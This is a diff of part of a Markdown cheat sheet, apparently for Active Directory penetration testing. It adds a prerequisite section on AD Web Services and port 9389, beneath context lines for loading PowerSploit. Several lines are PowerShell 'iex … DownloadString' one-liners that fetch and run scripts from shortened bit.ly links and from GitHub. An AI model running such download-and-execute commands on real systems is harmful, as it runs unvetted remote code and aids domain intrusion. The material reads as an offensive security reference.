@@ -30,6 +30,19 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\Powe
 # PowerSploit Module
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
 ```
+## PRE-REQUISITE: AD Web Services on the DC
+
+On the error below when loading the AD module, ADWS must be reachable and running:
+- TCP port 9389 reachable from your endpoint (and listening on the DC) : ```Test-NetConnection DC01 -port 9389```
+- 
+
+```
+PS > iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+
+AVERTISSEMENT : Error initializing default drive: 'Unable to find a default server with Active Directory Web Services running.'.
+```
+For more info, read the article from [theitbros.om](
+https://theitbros.com/unable-to-find-a-default-server-with-active-directory-web-services-running/).
 
 ## ENUM : DOMAIN ADMIN
 ```powershell
